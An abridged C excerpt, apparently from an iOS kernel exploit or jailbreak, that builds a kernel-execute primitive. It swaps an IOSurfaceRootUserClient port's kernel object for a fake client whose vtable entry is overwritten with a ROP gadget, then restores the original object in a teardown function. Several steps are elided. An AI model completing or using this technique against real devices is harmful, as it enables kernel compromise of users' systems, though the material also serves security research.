...
void init_kexecute(void) {
    ...
    IOSurfaceRootUserClient_addr = kread64(IOSurfaceRootUserClient_port + off_ipc_port_ip_kobject); // The UserClient itself (the C++ object) is at the kobject field
    ...
    fake_vtable_pipe = kalloc_via_pipe(fake_kalloc_size);
    fake_vtable = fake_vtable_pipe->kern_buffer;
    ...
    fake_client_pipe = kalloc_via_pipe(fake_kalloc_size);
    fake_client = fake_client_pipe->kern_buffer;
    ...
    kwrite64(IOSurfaceRootUserClient_port + off_ipc_port_ip_kobject, fake_client);

    // Now the userclient port we have will look into our fake user client rather than the old one

    // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
    kwrite64(fake_vtable+8*0xB8, kgad(KGADGET_ADD_X0_X0_0X40__RET));
...
void term_kexecute(void) {
    kwrite64(IOSurfaceRootUserClient_port + off_ipc_port_ip_kobject, IOSurfaceRootUserClient_addr);
    kfree_via_pipe(fake_vtable_pipe);
    kfree_via_pipe(fake_client_pipe);
}
